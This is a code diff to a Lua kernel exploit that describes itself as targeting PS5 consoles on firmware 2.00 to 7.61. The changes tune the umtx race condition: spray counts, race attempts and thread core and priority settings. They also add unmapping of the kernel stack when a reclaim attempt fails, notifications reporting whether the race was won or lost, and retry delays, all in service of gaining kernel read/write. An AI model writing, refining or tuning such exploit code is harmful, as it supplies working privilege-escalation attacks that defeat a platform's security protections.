@@ -15,17 +15,19 @@ force_kdata_patch_with_gpu = false
 
 umtx.config = {
     max_attempt = 100,
-    max_race_attempt = 0x100,
-    num_spray_fds = 0x28,
-    num_kprim_threads = 0x180,
+    max_race_attempt = 0x60,
+    num_spray_fds = 0x22,
+    num_kprim_threads = 0x100,
 }
 
 umtx.thread_config = {
-    main_thread = { core = 0, prio = 256 },
-    destroyer_thread = { core = {1, 2}, prio = 256 },
-    lookup_thread = { core = 4, prio = 400 },
+    main_thread = { core = 11, prio = 256 },
+    destroyer_thread = { core = {13, 14}, prio = 256 },
+    lookup_thread = { core = 15, prio = 400 },
     reclaim_thread = { core = -1, prio = 450 }
 }
+
+unmap_kstack_on_fail = true
 
 syscall.resolve({
     mprotect = 0x4a,
@@ -104,6 +106,12 @@ end
 function dbgf(...)
     if debug then
         dbg(string.format(...))
+    end
+end
+
+function dbgn(s)
+    if debug then
+        send_ps_notification(s)
     end
 end
 
@@ -911,11 +919,13 @@ function umtx.reclaim_kernel_stack()
         
         print("failed to access kstack. retry")
         
-        -- unmap failed allocation
-        -- todo: verify if this is required
-        -- if syscall.munmap(kstack, PAGE_SIZE):tonumber() == -1 then
-        --     print("munmap() error: " .. get_error_string())
-        -- end
+        if (unmap_kstack_on_fail) then
+            -- unmap failed allocation
+            print("unmapping kstack")
+            if syscall.munmap(kstack, PAGE_SIZE):tonumber() == -1 then
+                print("munmap() error: " .. get_error_string())
+            end
+        end
 
         return false
     end
@@ -1355,15 +1365,18 @@ function setup_kernel_rw()
         if umtx.race() then
 
             if umtx.reclaim_kernel_stack() then
+                dbgn("race won")
                 print("kstack successfully reclaimed")
                 break
             end
 
+            dbgn("race lost")
             -- ask all kprim to exit if not yet win
             print("waiting all kprim threads to exit...")
             memory.write_qword(umtx.data.kprim.exit_signal, 1)
             wait_for(umtx.data.kprim.exited_count, umtx.config.num_kprim_threads)
         end
+        sleep(50 * i, "ms")
     end
 
     return umtx.data.kstack
@@ -1380,21 +1393,37 @@ function print_info()
     dbgf("libc base @ %s", hex(libc_base))
     dbgf("libkernel base @ %s\n", hex(libkernel_base))
 
+
+    local notification_txt = "exploit config:\n"
     print("exploit config:")
     for k,v in pairs(umtx.config) do
         printf("%s = %s", k, (v))
+        notification_txt = notification_txt .. string.format("%s = %s\n", k, (v))
     end
 
+    notification_txt = notification_txt .. "thread config:\n"
     print("\nthread config:")
     for k,v in pairs(umtx.thread_config) do
         local core = v.core
         local prio = v.prio
         if k == "destroyer_thread" then
             printf("%s = core %d,%d prio %d", k, core[1], core[2], prio)
+            notification_txt = notification_txt .. string.format("%s = core %d,%d prio %d\n", k, core[1], core[2], prio)
         else
             printf("%s = core %d prio %d", k, core, prio)
+            notification_txt = notification_txt .. string.format("%s = core %d prio %d\n", k, core, prio)
         end
     end
+
+    if (unmap_kstack_on_fail) then
+        print("unmap_kstack_on_fail=true")
+        notification_txt = notification_txt .. "unmap_kstack_on_fail=true\n"
+    else
+        print("unmap_kstack_on_fail=false")
+        notification_txt = notification_txt .. "unmap_kstack_on_fail=false\n"
+    end
+
+    dbgn(notification_txt)
 
 end
 
@@ -1480,6 +1509,7 @@ function main()
 
     if PLATFORM ~= "ps5" or tonumber(FW_VERSION) < 2 or tonumber(FW_VERSION) > 7.61 then
         printf("this exploit only works on ps5 (2.00 <= fw <= 7.61) (current %s %s)", PLATFORM, FW_VERSION)
+        send_ps_notification("this exploit only works on ps5 (2.00 <= fw <= 7.61)")
         return
     end
 
